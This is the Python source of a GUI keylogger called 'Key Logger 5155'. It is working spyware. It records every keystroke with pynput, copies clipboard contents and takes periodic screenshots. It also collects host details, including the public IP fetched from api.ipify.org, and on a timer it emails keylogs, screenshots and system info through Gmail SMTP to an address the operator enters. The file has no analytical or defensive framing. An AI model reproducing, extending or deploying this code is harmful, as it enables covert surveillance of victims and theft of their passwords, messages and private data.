from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from time import sleep
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from requests import get
import threading
from PIL import ImageGrab, Image, ImageTk
from tkinter import Label,Frame, Entry, Button, messagebox,StringVar
from tkinter import ttk
from customtkinter import CTk
import logging
import json
import datetime

logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s, %(message)s')

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

# Load config from config.json
config_path = os.path.join(os.path.dirname(__file__), "config.json")
with open(config_path, "r") as f:
    config = json.load(f)

email_address = config.get("email_address", "")
password = config.get("password", "")
copy_clipboard_interval = int(config.get("copy_clipboard_interval", 10))
send_email_interval = int(config.get("send_email_interval", 30))
screenshot_interval = int(config.get("screenshot_interval", 30))
computer_info_interval = int(config.get("computer_info_interval", 30))

state = 0
stopFlag = False

def on_closing():
    global stopFlag
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        stopFlag = True
        root.destroy()

def send_bundle_email(toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Bundle Log"
    body = "Latest keylog, system info, and screenshots."
    msg.attach(MIMEText(body, 'plain'))

    # Time window
    window_sec = send_email_interval + 10
    now = datetime.datetime.now()
    cutoff = now - datetime.timedelta(seconds=window_sec)

    # Attach screenshots
    screenshot_dir = os.path.join(os.path.dirname(__file__), "screenshot")
    if os.path.exists(screenshot_dir):
        for fname in os.listdir(screenshot_dir):
            if fname.endswith(".png"):
                # Parse timestamp from filename
                try:
                    ts_str = fname.replace("screenshot_","").replace(".png","")
                    ts = datetime.datetime.strptime(ts_str, "%Y%m%d_%H%M%S")
                    if ts >= cutoff:
                        fpath = os.path.join(screenshot_dir, fname)
                        with open(fpath, "rb") as f:
                            p = MIMEBase('application', 'octet-stream')
                            p.set_payload(f.read())
                            encoders.encode_base64(p)
                            p.add_header('Content-Disposition', f"attachment; filename={fname}")
                            msg.attach(p)
                except Exception:
                    continue

    # Attach latest keylog
    if os.path.exists(keys_information):
        with open(keys_information, "rb") as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={keys_information}")
            msg.attach(p)

    # Attach latest system info
    if os.path.exists(system_information):
        with open(system_information, "rb") as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={system_information}")
            msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip+"\n")

        except Exception:
            f.write("Public IP Address: Couldn't get Public IP Address\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

def copy_clipboard():
   with open(clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\nClipboard Data: \n" + pasted_data)

        except:
            f.write("\nClipboard could be not be copied")

def screenshot():
    screenshot_dir = os.path.join(os.path.dirname(__file__), "screenshot")
    if not os.path.exists(screenshot_dir):
        os.makedirs(screenshot_dir)
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"
    filepath = os.path.join(screenshot_dir, filename)
    im = ImageGrab.grab()
    im.save(filepath)

count = 0
keys =[]

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    for key in keys:
        k = str(key).replace("'", "")
        logging.info(k)
listener = Listener(on_press=on_press)

def start_logger():
    global listener, toAddr, btnStr
    count = 0
    listener.start()
    btnStr.set("Stop Keylogger")
    while True:
        if stopFlag:
            break
        if count % copy_clipboard_interval == 0:
            copy_clipboard()
        if count % screenshot_interval == 0:
            screenshot()
        if count % computer_info_interval == 0:
            computer_information()
        if count % send_email_interval == 0:
            send_bundle_email(toAddr)
        sleep(1)
        count += 1
    listener.stop()
    btnStr.set("Start Keylogger")
    listener = Listener(on_press=on_press)

def on_button_click():
    global state,toAddr,listener,stopFlag,receiver_entry,btnStr
    toAddr = receiver_entry.get()
    if (receiver_entry['state'] == 'normal'):
        receiver_entry['state'] = 'disabled'
        btnStr.set("Starting...")
    else:
        receiver_entry['state'] = 'normal'
        btnStr.set("Stopping...")
    if state==0:
        state = 1
        print(state)
        stopFlag = False
        thread = threading.Thread(target=start_logger)
        thread.start()
    elif state==1:
        state=0
        print(state)
        stopFlag = True
        btnStr.set("Start Keylogger") 

root = CTk()
root.geometry("800x600")
root.config(bg="black")
root.protocol("WM_DELETE_WINDOW", on_closing)
btnStr = StringVar()
btnStr.set("Start Keylogger")

# Style the tab bar (ttk.Notebook) to have a black background
style = ttk.Style()
try:
    # Use a theme that respects background colors
    style.theme_use('clam')
except Exception:
    pass
style.configure('TNotebook', background='black', borderwidth=0)
style.configure('TNotebook.Tab', background='black', foreground='green')
style.map('TNotebook.Tab',
          background=[('selected', 'black'), ('active', 'black'), ('!selected', 'black')],
          foreground=[('selected', 'green'), ('!selected', 'green')])
# Tabs setup
notebook = ttk.Notebook(root)
notebook.pack(fill='both', expand=True)

# Logger tab
logger_tab = Frame(notebook, bg="black")
notebook.add(logger_tab, text="Logger")

image = Image.open('cracking.png')
resize_image = image.resize((300, 300))
img = ImageTk.PhotoImage(resize_image)
root.after(201, lambda :root.iconbitmap('cracking.ico'))
icon = Label(logger_tab, image=img, bg="black", width=300,height=400)
icon.pack()
root.title("Key Logger 5155")
Title = Label(logger_tab, text="Key Logger 5155", font=("Cascadia Code", 50, "bold"),pady=20, bg="black", fg="green")
Title.pack()
InputFrame = Frame(logger_tab, bg="black", pady=20)
InputFrame.pack()
receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("Cascadia Code", 13, "bold"),pady=20, bg="black", fg="green")
receiver_entry = Entry(InputFrame, bg="black", fg="green", width=35, font=("Cascadia Code", 13, "bold"))
receiver_entry.grid(row=0,column=1)
receiver_label.grid(row=0,column=0)
button = Button(logger_tab, textvariable=btnStr, command=on_button_click, width=30, bg="green",font=("Cascadia Code", 13, "bold") )
button.pack()

# Settings tab
settings_tab = Frame(notebook, bg="black")
notebook.add(settings_tab, text="Settings")

# Variables bound to entries
copy_interval_var = StringVar(value=str(copy_clipboard_interval))
send_email_interval_var = StringVar(value=str(send_email_interval))
screenshot_interval_var = StringVar(value=str(screenshot_interval))
computer_info_interval_var = StringVar(value=str(computer_info_interval))

def save_settings():
    global copy_clipboard_interval, send_email_interval, screenshot_interval, computer_info_interval, config
    try:
        new_copy = int(copy_interval_var.get())
        new_send = int(send_email_interval_var.get())
        new_shot = int(screenshot_interval_var.get())
        new_info = int(computer_info_interval_var.get())
        if min(new_copy, new_send, new_shot, new_info) <= 0:
            raise ValueError("Intervals must be positive integers")
    except Exception as e:
        messagebox.showerror("Invalid Input", f"Please enter valid positive integers for intervals.\nError: {e}")
        return
    # Apply to runtime
    copy_clipboard_interval = new_copy
    send_email_interval = new_send
    screenshot_interval = new_shot
    computer_info_interval = new_info
    # Persist to config.json (keep email & password unchanged)
    config['copy_clipboard_interval'] = new_copy
    config['send_email_interval'] = new_send
    config['screenshot_interval'] = new_shot
    config['computer_info_interval'] = new_info
    try:
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        messagebox.showinfo("Saved", "Settings saved successfully.")
    except Exception as e:
        messagebox.showerror("Save Failed", f"Could not save settings.\nError: {e}")

def reset_settings():
    # Reload from current config dict
    copy_interval_var.set(str(config.get('copy_clipboard_interval', copy_clipboard_interval)))
    send_email_interval_var.set(str(config.get('send_email_interval', send_email_interval)))
    screenshot_interval_var.set(str(config.get('screenshot_interval', screenshot_interval)))
    computer_info_interval_var.set(str(config.get('computer_info_interval', computer_info_interval)))

settings_frame = Frame(settings_tab, bg="black")
settings_frame.pack(pady=20)

row = 0
Label(settings_frame, text="Copy Clipboard Interval (s)", font=("Cascadia Code", 13, "bold"), bg="black", fg="green").grid(row=row, column=0, sticky='e', padx=10, pady=8)
Entry(settings_frame, textvariable=copy_interval_var, bg="black", fg="green", width=15, font=("Cascadia Code", 13, "bold")).grid(row=row, column=1, sticky='w')
row += 1
Label(settings_frame, text="Send Email Interval (s)", font=("Cascadia Code", 13, "bold"), bg="black", fg="green").grid(row=row, column=0, sticky='e', padx=10, pady=8)
Entry(settings_frame, textvariable=send_email_interval_var, bg="black", fg="green", width=15, font=("Cascadia Code", 13, "bold")).grid(row=row, column=1, sticky='w')
row += 1
Label(settings_frame, text="Screenshot Interval (s)", font=("Cascadia Code", 13, "bold"), bg="black", fg="green").grid(row=row, column=0, sticky='e', padx=10, pady=8)
Entry(settings_frame, textvariable=screenshot_interval_var, bg="black", fg="green", width=15, font=("Cascadia Code", 13, "bold")).grid(row=row, column=1, sticky='w')
row += 1
Label(settings_frame, text="Computer Info Interval (s)", font=("Cascadia Code", 13, "bold"), bg="black", fg="green").grid(row=row, column=0, sticky='e', padx=10, pady=8)
Entry(settings_frame, textvariable=computer_info_interval_var, bg="black", fg="green", width=15, font=("Cascadia Code", 13, "bold")).grid(row=row, column=1, sticky='w')

buttons_frame = Frame(settings_tab, bg="black")
buttons_frame.pack(pady=10)
Button(buttons_frame, text="Save Settings", command=save_settings, width=20, bg="green", font=("Cascadia Code", 13, "bold")).grid(row=0, column=0, padx=10)
Button(buttons_frame, text="Reset", command=reset_settings, width=12, bg="green", font=("Cascadia Code", 13, "bold")).grid(row=0, column=1, padx=10)

root.mainloop()